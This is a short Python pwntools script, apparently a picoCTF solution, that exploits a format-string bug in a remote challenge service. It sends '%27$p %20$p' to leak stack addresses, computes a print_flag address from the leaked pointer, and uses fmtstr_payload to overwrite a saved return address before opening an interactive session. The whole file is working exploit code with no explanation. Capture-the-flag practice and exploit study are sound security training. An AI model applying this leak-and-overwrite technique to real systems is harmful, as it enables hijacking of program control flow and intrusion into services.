from pwn import *

context.arch = 'amd64'

# HOST, PORT = '127.0.0.1', 31337
HOST, PORT = 'shape-facility.picoctf.net', 49534
r = remote(HOST, PORT)

r.recvuntil(': \n')
r.sendline('%27$p %20$p')
r.recvuntil('distance: ')
main, echo_valley_return = r.recvline().decode().strip().split()
print_flag = int(main, 16) - 408
payload = fmtstr_payload(6, {int(echo_valley_return, 16) - 8: print_flag}, write_size='short')
r.sendline(payload)
r.sendline('exit')
r.interactive()